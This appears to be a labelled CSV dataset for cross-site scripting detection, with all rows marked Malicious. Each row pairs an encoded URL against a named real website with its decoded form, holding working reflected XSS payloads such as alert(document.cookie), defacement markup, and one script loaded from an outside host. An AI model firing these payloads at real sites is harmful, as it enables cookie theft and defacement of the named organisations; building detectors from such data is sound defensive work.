Payloads,Class,decoded,executed,parser_changed
http://www.tulane-app.org/9813/login.asp?pin=a2n3a1i8r7b749~8&amp;wcc=tu3&amp;c=%22%3e%3cscript%3ealert(docu<br>ment.cookie)%3c/script%3e,Malicious,"http://www.tulane-app.org/9813/login.asp?pin=a2n3a1i8r7b749~8&wcc=tu3&c=""><script>alert(document.cookie)</script>",True,True
http://artslivres.com/showarticle.php?id=1%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://artslivres.com/showarticle.php?id=1""><script>alert(document.cookie)</script>",True,True
http://store.blackberryitalia.it/platformmain.asp?platform=5&amp;sstring_39616.5745486111=%22%3e%3cscrip<br>t%3ealert%28%22fugitif%22%29%3c%2fscript%3e&amp;sstring=%22%3e%3cscript%3ealert%28%22fugitif%22%29%3c%2f<br>script%3e&amp;cmdsearch.x=9&amp;cmdsearch.y=12,Malicious,"http://store.blackberryitalia.it/platformmain.asp?platform=5&sstring_39616.5745486111=""><script>alert(""fugitif"")</script>&sstring=""><script>alert(""fugitif"")</script>&cmdsearch.x=9&cmdsearch.y=12",True,True
http://www.cs.com.tr/display.php?tfound=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.cs.com.tr/display.php?tfound=""><script>alert(document.cookie)</script>",True,True
http://www.falbygdensost.se/mat_upplevelse/ostbrickan/forslag/page.asp?title=&lt;script&gt;alert(&quot;the%20be<br>st%20xsser&quot;)&lt;/script&gt;,Malicious,"http://www.falbygdensost.se/mat_upplevelse/ostbrickan/forslag/page.asp?title=<script>alert(""the best xsser"")</script>",True,True
http://house.1-apple.com.tw/index.cfm?fuseaction=view_housespecial&amp;newsdate=20080325&amp;housesecid=3038<br>4716&amp;secname=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;,Malicious,"http://house.1-apple.com.tw/index.cfm?fuseaction=view_housespecial&newsdate=20080325&housesecid=30384716&secname=<script>alert(""xss"")</script>",True,True
http://www.cyprus-directory.com/cgi-bin/tseekdir.cgi?location=root-arts_and_humanities-museums%27%3e%3cscript%3ealert%28%22cr4t3r%20was%20here%22%29;//%3c/script%3e,Malicious,"http://www.cyprus-directory.com/cgi-bin/tseekdir.cgi?location=root-arts_and_humanities-museums'><script>alert(""cr4t3r was here"");//</script>",True,True
http://sourceforge.net/pm/?group_id=23&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://sourceforge.net/pm/?group_id=23""><script>alert(1)</script>",True,True
http://www.xylitol.net/index.php?action=search&amp;search-action=search&amp;search-phrase=%22%3e%3cscript%3e<br>alert%280%29%3c%2fscript%3e&amp;x=10&amp;y=7,Malicious,"http://www.xylitol.net/index.php?action=search&search-action=search&search-phrase=""><script>alert(0)</script>&x=10&y=7",True,True
http://www.yazilimindir.com/index.php?scm=1&amp;ara=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3<br>e,Malicious,"http://www.yazilimindir.com/index.php?scm=1&ara=""><script>alert(document.cookie)</script>",True,True
id=2&nombre=queso+manchego&precio=%253cscript%253ealert%2528%2522paros%2522%2529%253b%253c%252fscript%253e&cantidad=2&b1=a%f1adir+al+carrito,Malicious,"id=2&nombre=queso manchego&precio=<script>alert(""paros"");</script>&cantidad=2&b1=a�adir al carrito",True,True
http://script.starpass.fr/numero_pays_v3.php?pays=fr&amp;id_document=5600%27%22%3e%3c/title%3e%3cscript%<br>3ealert(1)%3c/script%3e,Malicious,"http://script.starpass.fr/numero_pays_v3.php?pays=fr&id_document=5600'""></title><script>alert(1)</script>",True,True
http://www.gazetemuzik.net/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(do<br>cument.cookie)&lt;/script&gt;,Malicious,"http://www.gazetemuzik.net/scripts/kayit.asp?id=3558&dil=tr&page=grup.asp&results=""><script>alert(document.cookie)</script>",True,True
http://www.meijiang.gov.cn/goto.asp?topicid=543}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.sou<br>rce));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.meijiang.gov.cn/goto.asp?topicid=543}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://cityguide.nyjournalnews.com/fe/calendarnew/search.asp?selectedeventsection=&quot;&gt;&lt;script&gt;alert(&quot;m<br>axwel&quot;)&lt;/script&gt;,Malicious,"http://cityguide.nyjournalnews.com/fe/calendarnew/search.asp?selectedeventsection=""><script>alert(""maxwel"")</script>",True,True
http://www.tesnexus.com/downloads/file.php?id=15607}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/<br>.source));%3c/script%3e}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e,Malicious,http://www.tesnexus.com/downloads/file.php?id=15607}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.culturepub.fr/recherche.html?q=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript<br>%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious,"http://www.culturepub.fr/recherche.html?q='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://ms136.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms136.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.salepc.com.tr/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.salepc.com.tr/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
http://phraecampus.ob.tc/-view.php?n=64&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://phraecampus.ob.tc/-view.php?n=64""><script>alert(document.cookie)</script>",True,True
searchintopic=%2f%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&fid=2&tid=30093,Malicious,"searchintopic=/""><script>alert(1)</script>&fid=2&tid=30093",True,True
http://www.almeirim.pt/catalogo/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;scri<br>pt&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.almeirim.pt/catalogo/pesqres.asp?startrec=0&base=web&form=comp&recpag=5&searchtxt=""><script>alert(document.cookie)</script>",True,True
http://www.channelnext.ca/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.channelnext.ca/register.php?ref=""><script>alert(1);</script>",True,True
http://www.americasarmy.com/realheroes/index.php?id=&quot;&gt;&lt;script&gt;alert('hacked%20by%20turkpower')&lt;/scri<br>pt&gt;&lt;h1&gt;defaced%20by%20turkpower&lt;/h1&gt;='%22%3e%3ciframe%20src=http://xssed.com%3e,Malicious,"http://www.americasarmy.com/realheroes/index.php?id=""><script>alert('hacked by turkpower')</script><h1>defaced by turkpower</h1>='""><iframe src=http://xssed.com>",True,True
http://www.ieice.org/ken/program/index.php?tgs_regid=469a50ccaec5cc76bd3fb27807d357eee010ddb2c32a74c<br>55246123937acbe7a&amp;cmd=show_form&amp;form_code=kacp&amp;layout=&amp;lang=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%2<br>9%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.ieice.org/ken/program/index.php?tgs_regid=469a50ccaec5cc76bd3fb27807d357eee010ddb2c32a74c55246123937acbe7a&cmd=show_form&form_code=kacp&layout=&lang="">'><script>alert(String.fromCharCode(88,83,83))</script>
",True,True
http://muzik.ekolay.net/haber_ara/index.asp?q=msn+almak&amp;exp=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious,"http://muzik.ekolay.net/haber_ara/index.asp?q=msn almak&exp=""><script>alert(1)</script>",True,True
http://www.tavakoli-rug.com/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.tavakoli-rug.com/gallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.yzagri.gov.cn/newssubjectdetail.php?ej=&amp;mainid=1064802412&amp;infoid=&lt;script&gt;alert(/xss/)&lt;/sc<br>ript&gt;,Malicious,http://www.yzagri.gov.cn/newssubjectdetail.php?ej=&mainid=1064802412&infoid=<script>alert(/xss/)</script>,True,True
http://www.espnshop.com/catalog/advancedsearch/?keyword=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3<br>e,Malicious,"http://www.espnshop.com/catalog/advancedsearch/?keyword=""><script>alert(1)</script>",True,True
http://www.vodafonelive.de/cp/logotones?vf_partnerurl=%3c/script%3e%3cscript%3ealert(%22totalschaden<br>%22)%3c/script%3etotalschaden,Malicious,"http://www.vodafonelive.de/cp/logotones?vf_partnerurl=</script><script>alert(""totalschaden"")</script>totalschaden",True,True
http://baltimore.orioles.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious,http://baltimore.orioles.mlb.com/media/video.jsp?mid=<script>alert('pappy was here');</script>,True,True
https://pib24.com/webbank/resources/jsp/ib.jsp?usern=1111111111%22%3e%3cscript%3ealert(/irsdl/)%3c/s<br>cript%3e%3cfake%20a=%22,Malicious,"https://pib24.com/webbank/resources/jsp/ib.jsp?usern=1111111111""><script>alert(/irsdl/)</script><fake a=""",True,True
http://electronicdesign.com/articles/index.cfm?action=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://electronicdesign.com/articles/index.cfm?action=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://imdb.com/list?countries=&quot;&gt;&lt;script&gt;alert(/www.r3t.n3t.nl/)&lt;/script&gt;,Malicious,"http://imdb.com/list?countries=""><script>alert(/www.r3t.n3t.nl/)</script>",True,True
http://notrefamille.femmes.fr.msn.com/v2/services-prenom/prenom-arabe-email.asp?prenom=%22%3e%3cscri<br>pt%3ealert('by encore')%3c/script%3e,Malicious,"http://notrefamille.femmes.fr.msn.com/v2/services-prenom/prenom-arabe-email.asp?prenom=""><script>alert('by encore')</script>",True,True
http://www.radikal.com.tr/arsiv.php?istenen_arsiv_yili=''&gt;&lt;script&gt;alert('xss')&lt;/script&gt;''&gt;&lt;h1&gt;hacked<br>narcoticxs&lt;/h1&gt;,Malicious,http://www.radikal.com.tr/arsiv.php?istenen_arsiv_yili=''><script>alert('xss')</script>''><h1>hackednarcoticxs</h1>,True,True
http://www.bitkiselaktar.com/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/s<br>cript%3e,Malicious,"http://www.bitkiselaktar.com/odeme.asp?defurunid=""><script>alert(""document.cookie"")</script>",True,True
http://help.travian.ru/index.php?type=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_omeha/);alert(d<br>ocument.cookie);%3c/script%3e,Malicious,"http://help.travian.ru/index.php?type=""></script><script>alert(/xssed_by_omeha/);alert(document.cookie);</script>",True,True
http://www.nativeponiesonline.co.uk/classads/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.nativeponiesonline.co.uk/classads/signinform.php?msg=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://unionsverlag.ch/info/titlelist.asp?sort=first_edition%20desc&amp;title=&lt;script&gt;alert(&quot;scriptorium<br>(turkey)&quot;)&lt;/script&gt;,Malicious,"http://unionsverlag.ch/info/titlelist.asp?sort=first_edition desc&title=<script>alert(""scriptorium(turkey)"")</script>",True,True
http://www.lei-ming.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.lei-ming.com/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://esa.un.org/esaweb/referenceservice/inventory/pgviewactivities.asp?titlestring=&lt;script&gt;alert('<br>xssed%20lol%20:)%20');&lt;/script&gt;,Malicious,http://esa.un.org/esaweb/referenceservice/inventory/pgviewactivities.asp?titlestring=<script>alert('xssed lol :) ');</script>,True,True
http://vippers.no.land.to/mtbbs2/test/thread_search.cgi?bbs=x&amp;key=1193498047%22%3e'%3e%3cscript%3eal<br>ert(123)%3c/script%3e,Malicious,"http://vippers.no.land.to/mtbbs2/test/thread_search.cgi?bbs=x&key=1193498047"">'><script>alert(123)</script>",True,True
http://www.e-secim.com/sonuc.asp?prt=&lt;script&gt;alert(&quot;starext&quot;)&lt;/script&gt;,Malicious,"http://www.e-secim.com/sonuc.asp?prt=<script>alert(""starext"")</script>",True,True
https://secure.ipowerweb.com/cgi-bin/hosting/signup.cgi?domain=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;input<br>type=&quot;hidden,Malicious,"https://secure.ipowerweb.com/cgi-bin/hosting/signup.cgi?domain=""><script>alert(1)</script><inputtype=""hidden",True,True
http://www.ulakbim.gov.tr/dokumanlar/programlama/phpwebdevel/intro/examples/phpinfo.php?a[]=%3e%3csc<br>ript%3ealert(/kabus/);%3c/script%3e,Malicious,http://www.ulakbim.gov.tr/dokumanlar/programlama/phpwebdevel/intro/examples/phpinfo.php?a[]=><script>alert(/kabus/);</script>,True,True
http://www.yello.com.sg/realestate.php?cat1=realestate&amp;catid=3&amp;pr=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.yello.com.sg/realestate.php?cat1=realestate&catid=3&pr=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.portviewconstruction.co.uk/replica/philboard/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;a<br>lert(document.cookie)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious,"http://www.portviewconstruction.co.uk/replica/philboard/philboard_search.asp?searchterms=""><script>alert(document.cookie)</script><h1>www.raptr.us.tc</h1>",True,True
"http://de.mcdonalds.fantasy.fifa.com/m/stats.mc?stat=leaders&amp;phase=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(12345,4<br>252048958)%3b&lt;/script&gt;&amp;page=2",Malicious,"http://de.mcdonalds.fantasy.fifa.com/m/stats.mc?stat=leaders&phase=>""><script 
>alert(12345,4252048958);</script>&page=2",True,True
http://leverage-wiki.tnt.tv/account/%3e%3cscript%3ealert(%22xss%20by%20azat%22)%3c%2fscript%3e,Malicious,"http://leverage-wiki.tnt.tv/account/><script>alert(""xss by azat"")</script>",True,True
http://www.dekodem.com/atolye/galeri/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.dekodem.com/atolye/galeri/login.asp?folder=&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://defense.aol.com/search/?q=%3cimg+%22%22%22%3e%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e%22%3e,Malicious,"http://defense.aol.com/search/?q=<img """"""><script>alert(""xss"")</script>"">",True,True
http://www.ecoletheologique-stcyprien.org/index.php?option=com_doqment&amp;cid=%27%22%3e%3c/title%3e%3cs<br>cript%3ealert%281337%29%3c/script%3e,Malicious,"http://www.ecoletheologique-stcyprien.org/index.php?option=com_doqment&cid='""></title><script>alert(1337)</script>",True,True
http://www.legoorin.com/search.php?kword=%2525%2b100%2bkurdi&amp;page=10&amp;search_sid=111-222-1933email@ad<br>dress.com&amp;search_path=&gt;'&gt;&lt;script%20%0a%0d&gt;alert(612117574)%3b&lt;/script&gt;,Malicious,"http://www.legoorin.com/search.php?kword=% 100 kurdi&page=10&search_sid=111-222-1933email@address.com&search_path=>'><script 
>alert(612117574);</script>",True,True
http://www.dha.com.tr/listele.php?t=4%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious,"http://www.dha.com.tr/listele.php?t=4""><script>alert(1)</script>",True,True
http://www.bot258.com/index.php?goo=pay_reply.dwt&amp;orderid=&amp;state=0&amp;strinfo=%22%3e%3cscript%3ealert(/<br>123/)%3c/script%3e,Malicious,"http://www.bot258.com/index.php?goo=pay_reply.dwt&orderid=&state=0&strinfo=""><script>alert(/123/)</script>",True,True
http://store.steampowered.com/search/?developer=valve%27%22%3e%3cscript%3ealert(document.cookie)%3c/<br>script%3e,Malicious,"http://store.steampowered.com/search/?developer=valve'""><script>alert(document.cookie)</script>",True,True
http://www.gougou.com/search?search=%22%3e'%3e%3cscript%3ealert(123)%3c%2fscript%3e%22'&amp;suffix=&amp;rest<br>ype=-1&amp;id=2,Malicious,"http://www.gougou.com/search?search="">'><script>alert(123)</script>""'&suffix=&restype=-1&id=2",True,True
https://support.tenablesecurity.com/support-center/index.php?x=&amp;forgot_email=%22%3e%3cscript%3ealert<br>(document.cookie)%3c/script%3e&amp;form_submit=forgot_email&amp;mod_id=6,Malicious,"https://support.tenablesecurity.com/support-center/index.php?x=&forgot_email=""><script>alert(document.cookie)</script>&form_submit=forgot_email&mod_id=6",True,True
http://forums.digiguide.com/forum.asp?id=32&quot;&gt;http://www.cidghana.org/forum/skapainlagg.asp?id=0&quot;&gt;&lt;sc<br>ript&gt;alert('xss')&lt;/script&gt; &lt;- adding a vulnerable url activates an xss flaw poc,Malicious,"http://forums.digiguide.com/forum.asp?id=32"">http://www.cidghana.org/forum/skapainlagg.asp?id=0""><script>alert('xss')</script> <- adding a vulnerable url activates an xss flaw poc",True,True
http://www.skype.gx.cn/huanqiu.asp?form_country=%22%3e%3cscript%3ealert%28/xss/%29%3c/script%3e,Malicious,"http://www.skype.gx.cn/huanqiu.asp?form_country=""><script>alert(/xss/)</script>",True,True
http://www.dsa.org/search/siterslt.cfm?criteria=%22%3e%3cscript%3ealert(%22fucked%22)%3c%2fscript%3e<br>&amp;go.x=0&amp;go.y=0&amp;go=go,Malicious,"http://www.dsa.org/search/siterslt.cfm?criteria=""><script>alert(""fucked"")</script>&go.x=0&go.y=0&go=go",True,True
http://xssed.by.azat.photobucket.com/guestlogin?loginform[albumurl]=http://s289.photobucket.com/albu<br>ms/ll233/&gt;&lt;script&gt;alert(&quot;xssed%20by%20azat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xssed%20by%20azat&quot;)&lt;/script&gt;&gt;&lt;s<br>cript&gt;alert(&quot;xssed%20byazat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xssed%20by%20azat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xs<br>sed%20byazat&quot;)&lt;/script&gt;&amp;loginform[redirectaction]=&amp;loginform[password]=&gt;&lt;script&gt;alert(&quot;xssed')&lt;/scri<br>pt&gt;&amp;login=&gt;&lt;script&gt;alert(&quot;xssed&quot;)&lt;/script&gt;,Malicious,"http://xssed.by.azat.photobucket.com/guestlogin?loginform[albumurl]=http://s289.photobucket.com/albums/ll233/><script>alert(""xssed by azat"")</script>><script>alert(""xssed by azat"")</script>><script>alert(""xssed byazat"")</script>><script>alert(""xssed by azat"")</script>><script>alert(""xssed byazat"")</script>&loginform[redirectaction]=&loginform[password]=><script>alert(""xssed')</script>&login=><script>alert(""xssed"")</script>",True,True
http://www.cbc.ca/programguide/program/index.jsp?program=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.cbc.ca/programguide/program/index.jsp?program=""><script>alert(""maxwel"")</script>",True,True
http://www.domain.com/order2.php?defaultsvcname=pem-estnd&amp;defaultsvcprodtype=pem-estndy&amp;defaultsvcqt<br>y=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.domain.com/order2.php?defaultsvcname=pem-estnd&defaultsvcprodtype=pem-estndy&defaultsvcqty=""><script>alert(document.cookie)</script>",True,True
http://www.gulum.net/hazir-mesaj/bolumler.php?op=katbak&amp;id=55&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious,"http://www.gulum.net/hazir-mesaj/bolumler.php?op=katbak&id=55""><script>alert(document.cookie)</script>",True,True
http://www.fujitv.co.jp/safe/red_mpl/response/m/banmes.cgi?code=499000017&amp;url=%2fsafe%2fred_m%22%3e'<br>%3e%3cscript%3ealert('xss%20by%20kusomiso.com')%3c/script%3epl%2fm%2fpgm_mobile.cgi%3fbcd%3d49900001<br>7%26url%3d%252fm%252fanime%252ehtml%26type%3dm,Malicious,"http://www.fujitv.co.jp/safe/red_mpl/response/m/banmes.cgi?code=499000017&url=/safe/red_m"">'><script>alert('xss by kusomiso.com')</script>pl/m/pgm_mobile.cgi?bcd=499000017&url=/m/anime.html&type=m",True,True
http://www.lucanineuropa.eu/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.lucanineuropa.eu/igallery34/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://4travel.travel.msn.co.jp/e/msn/search/?keywords= &quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://4travel.travel.msn.co.jp/e/msn/search/?keywords= ""><script>alert(document.cookie)</script>",True,True
http://www.fdp-menznau.ch/artmedic_cms33/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.fdp-menznau.ch/artmedic_cms33/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://pazaryeri.web.tr/search.asp?sh1=%22%3e%3cscript%3ealert(%22jock3r%22)%3c/script%3e,Malicious,"http://pazaryeri.web.tr/search.asp?sh1=""><script>alert(""jock3r"")</script>",True,True
http://altfarm.mediaplex.com/ad/ck/5156-86744-2357-56?kw=bb&amp;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,Malicious,"http://altfarm.mediaplex.com/ad/ck/5156-86744-2357-56?kw=bb&msg=<script>alert(""xssbydt"")</script>",True,True
http://www.adtechus.com/contact_form/?sessionid=fa1bdd21f535e65&amp;category=34&amp;anrede=mr.&amp;vorname=&amp;name<br>=&amp;company=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.adtechus.com/contact_form/?sessionid=fa1bdd21f535e65&category=34&anrede=mr.&vorname=&name=&company=""><script>alert(document.cookie)</script>",True,True
http://www.era.pl/pl/polec/?recommendpage=%22&gt;&lt;script&gt;alert(%27xss%27);&lt;/script&gt;,Malicious,"http://www.era.pl/pl/polec/?recommendpage=""><script>alert('xss');</script>",True,True
http://support.gomposerz.ch/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/chat<br>/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious,"http://support.gomposerz.ch/index.php?<script language=""javascript"" src=""http://kabustr.com/chat/c.js"" type=""text/javascript"">kabus-kabustr.com-kabus-kabustr.com</script><script>alert(document.cookie);</script><script>alert(/kabus/);</script>",True,True
http://be.playstation.com/search-results/?searchpattern=%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3ch1%3e%3cmarquee%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;submit-search=search,Malicious,"http://be.playstation.com/search-results/?searchpattern=""></title><script>alert(1337)</script><h1><marquee>xss by xylitol</h1></marquee>&submit-search=search",True,True
http://www.ieepo.gob.mx/dbase.htm?num=6&amp;keys=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b<br>%3c/script%3e&amp;x=0&amp;y=0,Malicious,"http://www.ieepo.gob.mx/dbase.htm?num=6&keys=>""><script 
>alert(document.domain);</script>&x=0&y=0",True,True
http://www.afnic.fr/obtenir/prestataires/valid?choix=parnom&amp;cherche_nom=%3cscript%3ealert(document.c<br>ookie)%3c/script%3e&amp;orderby=alpha,Malicious,http://www.afnic.fr/obtenir/prestataires/valid?choix=parnom&cherche_nom=<script>alert(document.cookie)</script>&orderby=alpha,True,True
http://www.avast.com/download-thank-you.php?src=http://files.avast.com/iavs5x/setup_av_free.exe--%3e<br>%22%3e'%3e'%22%3cscript%3econfirm(/best%20regards%20from%20bulgaria/)%3c/script%3e&amp;product=fa-avast&amp;<br>page=free-antivirus-download&amp;locale=en-ww&amp;avast=0,Malicious,"http://www.avast.com/download-thank-you.php?src=http://files.avast.com/iavs5x/setup_av_free.exe-->"">'>'""<script>confirm(/best regards from bulgaria/)</script>&product=fa-avast&page=free-antivirus-download&locale=en-ww&avast=0",True,True
http://www.ydre.se/web/ydre/internet.nsf/search?searchview&amp;query=(*%22%3e%3cscript%3ealert(123)%3c/s<br>cript%3e*)&amp;searchorder=1&amp;searchwv=true&amp;start=1&amp;count=250&amp;searchmax=250,Malicious,"http://www.ydre.se/web/ydre/internet.nsf/search?searchview&query=(*""><script>alert(123)</script>*)&searchorder=1&searchwv=true&start=1&count=250&searchmax=250",True,True
http://www.acris-rosmant.com/fr/toy+g.asp?lg=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.acris-rosmant.com/fr/toy g.asp?lg=""><script>alert(""maxwel"")</script>",True,True
http://aim.search.aol.com/search/search?s_it=searchbox.webhome&amp;query=%22s&amp;quot;s%22%3e%3cscript%3eal<br>ert(1);%3c/script%3e%20%22<br>http://aim.search.aol.com/search/search?s_it=searchbox.webhome&amp;query=%22s&amp;quot;s%22%3e%3cscript%3eal<br>ert(%22xssed%22);%3c/script%3e%20%22,Malicious,"http://aim.search.aol.com/search/search?s_it=searchbox.webhome&query=""s""s""><script>alert(1);</script> ""http://aim.search.aol.com/search/search?s_it=searchbox.webhome&query=""s""s""><script>alert(""xssed"");</script> """,True,True
http://aaadir.com/banks/branch/add/new.jsp?bank_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://aaadir.com/banks/branch/add/new.jsp?bank_id=""><script>alert(""maxwel"")</script>",True,True
